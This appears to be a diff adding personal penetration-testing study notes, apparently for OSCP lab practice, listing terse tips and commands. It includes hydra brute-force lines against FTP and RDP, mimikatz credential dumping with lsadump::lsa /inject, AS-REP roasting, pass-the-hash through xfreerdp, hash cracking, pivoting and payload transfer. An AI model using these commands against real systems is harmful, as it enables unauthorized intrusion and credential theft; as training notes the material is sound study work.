@@ -1,0 +1,68 @@
+
+	• FTP brute force ---> hydra -l gale -P /usr/share/wordlists/rockyou.txt ftp://<IP>
+
+	• Schtasks............... (For more detail about the schedule task)
+
+	• We can cat bat files
+
+	• Use registry command to enable RDP.
+
+	• Before running mimikatz commands type " "log" and it will log the mimikatz output as a record in a text file.
+
+	• lsadump::lsa /inject
+
+	• In ligolo agent command, use -retry option.
+
+	• For AS-REP roasting, try with or without credentials.
+
+	• File transfer through ligolo pivoting using listener_add (Port forwarding to transfer payloads)
+
+	• If the RDP says "Another user is signed in. If you continue, they will be disconnected" that means there is someone else signed in that we can dump creds on. If it is "Please wait for OSCP\Administrator to respond" Win win situation.
+	• ---> net localgroup administrators
+
+
+	• If can't transfer files on MS02, share a file sharing from MS01 and copy from there. (Derron C 2:18:00)
+
+
+
+
+	• Phpinfo - Document root (present directory where the page is running)
+
+	• Found any .exe file? Run exiftool to see metadata, software name and version.
+
+	• ---> dir /s /b local.txt   (search for a file in a current directory and it's sub directories)
+
+	• ---> dir /s/b *.log
+	• ---> dir /s/b *.txt 
+	• Use these commands in the new users directory once we get system. Maybe find some powershell history for that user. Always run winpeas even after system access. 
+
+	• ---> dir /s/b c:\*.zip   (zip pdf txt kdbx doc, etc.)
+
+	• While cracking password hashes with hashcat:  -r /usr/share/hashcat/rules/base64.rule
+
+	• Got valid creds? Check them on both ms02 and dc01 using netexec 
+
+
+
+
+	• Check passwords.txt from the xampp folder
+
+	• For file transfer using smbserver and RDP:
+	• "impacket-smbserver -smb2support stage ."
+	• In RDP - "\\<kali_IP>" and the copy files 
+
+	• Check Recycle bin folders in windows.
+
+	• Use +clipboard in xfreerdp (we can directly copy paste files)
+
+	• With John use rules as the second option if first standard one doesn't work. 
+	• --rules
+	• Also only --> john hash.txt
+
+	• Hydra for RDP brute forcing: 
+	• hydra -L users -P passwords rdp://<IP>
+
+	• xfreerdp Pass the hash: instead of /p:<password> field, use /pth:<hash>
+
+	• If administrator LAPS password doesn't work via winrm or RDP, use runasCs (winrm) or runas (RDP)
+
